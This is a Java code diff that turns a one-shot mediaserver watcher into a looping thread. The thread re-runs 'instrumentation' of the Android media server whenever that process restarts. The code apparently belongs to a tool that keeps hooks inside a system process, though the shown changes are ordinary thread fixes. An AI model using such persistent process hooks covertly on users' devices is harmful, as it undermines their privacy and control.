@@ -101,9 +101,15 @@ public class Instrument {
 
 			stopMonitor = false;
 
-			pidMonitor = new MediaserverMonitor(pid);
-			monitor = new Thread(pidMonitor);
-			monitor.start();
+			if (pidMonitor == null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
+				}
+				
+				pidMonitor = new MediaserverMonitor(pid);
+				monitor = new Thread(pidMonitor);
+				monitor.start();
+			}
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(getProcessPid): unable to get pid");
@@ -159,27 +165,29 @@ public class Instrument {
 
 		@Override
 		public void run() {
-			Utils.sleep(5000);
-
-			if (stopMonitor) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
+			while (true) {
+				Utils.sleep(10000);
+	
+				if (stopMonitor) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
+					}
+	
+					stopMonitor = false;
+					return;
 				}
-
-				stopMonitor = false;
-				return;
-			}
-
-			cur_pid = getProcessPid();
-
-			// Mediaserver died
-			if (cur_pid != start_pid) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
+	
+				cur_pid = getProcessPid();
+	
+				// Mediaserver died
+				if (cur_pid != start_pid) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
+					}
+	
+					startInstrumentation();
+					start_pid = getProcessPid();
 				}
-
-				startInstrumentation();
-				start_pid = getProcessPid();
 			}
 		}
 	}
